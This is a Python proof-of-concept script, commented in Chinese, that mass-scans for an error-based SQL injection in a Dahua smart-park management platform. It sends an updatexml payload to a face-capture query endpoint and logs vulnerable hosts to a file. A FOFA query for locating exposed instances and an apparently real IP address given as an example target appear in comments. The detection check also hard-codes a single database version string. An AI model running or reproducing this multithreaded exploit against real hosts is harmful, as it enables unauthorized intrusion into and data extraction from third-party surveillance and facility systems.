#-*- coding:utf-8 -*-
import argparse,sys,base64,requests
import re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

#fofa：app="dahua-智慧园区综合管理平台"
#案例：http://101.68.86.236:10443

def banner():
    content = '''


██████╗  █████╗ ██╗  ██╗██╗   ██╗ █████╗ ██████╗  ██████╗  ██████╗
██╔══██╗██╔══██╗██║  ██║██║   ██║██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║  ██║███████║███████║██║   ██║███████║██████╔╝██║   ██║██║     
██║  ██║██╔══██║██╔══██║██║   ██║██╔══██║██╔═══╝ ██║   ██║██║     
██████╔╝██║  ██║██║  ██║╚██████╔╝██║  ██║██║     ╚██████╔╝╚██████╗
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝      ╚═════╝  ╚═════╝
                                                                  



    '''
    print(content)

def poc(target):
    url = target + '/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20version()),0x7e),1)--%22%7D/extend/%7B%7D'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie': 'JSESSIONID=FAD75B3C8912402B93BEBED03A527266',
        'Accept-Encoding': 'gzip, deflate'
    }
    try:
        res = requests.get(url, headers=headers, verify=False, timeout=5).text
        if '5.7.15' in res:
            print(f'[+]{target}存在sql注入')
            with open('result.txt', 'a+', encoding='utf-8') as f:
                f.write(target + '\n')
                return True
        else:
            print(f'[-]{target}不存在sql注入')
            return False
    except:
        print(f'[-]{target}无法进入')

def main():
    banner()
    parser = argparse.ArgumentParser(description='大华sql注入漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='example:http://example.com')
    parser.add_argument('-f', '--file', dest='file', type=str, help='url.txt')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
            mp = Pool(100)
            mp.map(poc, url_list)
            mp.close()
            mp.join()
    else:
        print(f'Usage:\n\tpython3 {sys.argv[0]} -h')

if __name__ == '__main__':
    main()